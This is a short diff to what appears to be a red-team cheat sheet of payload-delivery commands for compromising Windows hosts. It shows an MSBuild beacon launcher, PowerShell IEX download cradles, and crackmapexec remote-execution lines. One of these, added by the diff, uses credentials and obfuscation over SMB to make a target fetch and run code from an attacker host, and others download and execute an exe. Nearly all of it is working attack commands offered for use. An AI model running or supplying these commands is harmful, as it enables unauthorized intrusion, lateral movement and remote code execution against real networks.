@@ -100,6 +100,7 @@ MSBuild Beacon
     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\host.domain\path\to\XMLfile.xml
   Powershell IEX
     "powershell iex (new-object net.webclient).downloadstring('http://10.10.10.10/update')"
+    sudo crackmapexec smb 10.10.5.30 --obfs -u username -p='password' -x "powershell.exe -version 3 -c IEX ([net.webclient]::new().downloadstring('http://10.10.5.13:80/update'))"
     Upload exe and execute
         iwr -uri http://10.10.5.13/myfile -outfile c:\windows\temp\test.exe
         crackmapexec smb 10.10.5.30 -u username -p password -X 'powershell.exe -version 3 iwr -uri http://10.10.5.13/myfile -outfile c:\windows\temp\test.exe'
